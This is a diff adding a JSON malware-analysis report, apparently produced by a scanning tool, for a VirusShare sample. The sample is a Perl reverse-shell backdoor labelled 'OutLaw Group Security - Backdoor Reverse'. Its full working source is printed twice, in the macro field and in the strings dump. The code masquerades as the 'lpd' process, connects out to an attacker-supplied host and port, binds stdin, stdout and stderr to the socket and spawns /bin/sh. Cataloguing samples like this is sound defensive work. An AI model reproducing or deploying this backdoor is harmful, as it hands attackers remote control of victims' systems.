@@ -1,0 +1,55 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "open": "May open a file",
+            "system": "May run an executable file or a system command on a Mac"
+        },
+        "macro": "#!/usr/bin/perl\n\nuse Socket;\n$pamer=\"OutLaw Group Security - Backdoor Reverse\\n\\n\";\n$cmd= \"lpd\";\n$system= 'echo \"`uname -a`\";echo \"`id`\";/bin/sh';\n$0=$cmd;\n$target=$ARGV[0];\n$port=$ARGV[1];\n$iaddr=inet_aton($target) || die(\"Error: $!\\n\");\n$paddr=sockaddr_in($port, $iaddr) || die(\"Error: $!\\n\");\n$proto=getprotobyname('tcp');\nsocket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die(\"Error: $!\\n\");\nconnect(SOCKET, $paddr) || die(\"Error: $!\\n\");\nopen(STDIN, \">&SOCKET\");\nopen(STDOUT, \">&SOCKET\");\nopen(STDERR, \">&SOCKET\");\nprint STDOUT $pamer;\nsystem($system);\nclose(STDIN);\nclose(STDOUT);\nclose(STDERR);"
+    },
+    "filename": "VirusShare_003936baa7851bd7557ac95e7a32fd83",
+    "filesize": 600,
+    "filetype": "Perl script text executable",
+    "hashes": {
+        "md5": "003936baa7851bd7557ac95e7a32fd83",
+        "sha1": "66560a9444bbcf83611707cdaf9ad1d7536e38f0",
+        "sha256": "255e37bd067bd278d310eae30e67cee2c5c80fe53548d927b17a22afab831895"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "#!/usr/bin/perl",
+            "use Socket;",
+            "$pamer=\"OutLaw Group Security - Backdoor Reverse\\n\\n\";",
+            "$cmd= \"lpd\";",
+            "$system= 'echo \"`uname -a`\";echo \"`id`\";/bin/sh';",
+            "$0=$cmd;",
+            "$target=$ARGV[0];",
+            "$port=$ARGV[1];",
+            "$iaddr=inet_aton($target) || die(\"Error: $!\\n\");",
+            "$paddr=sockaddr_in($port, $iaddr) || die(\"Error: $!\\n\");",
+            "$proto=getprotobyname('tcp');",
+            "socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die(\"Error: $!\\n\");",
+            "connect(SOCKET, $paddr) || die(\"Error: $!\\n\");",
+            "open(STDIN, \">&SOCKET\");",
+            "open(STDOUT, \">&SOCKET\");",
+            "open(STDERR, \">&SOCKET\");",
+            "print STDOUT $pamer;",
+            "system($system);",
+            "close(STDIN);",
+            "close(STDOUT);",
+            "close(STDERR);"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.269797",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
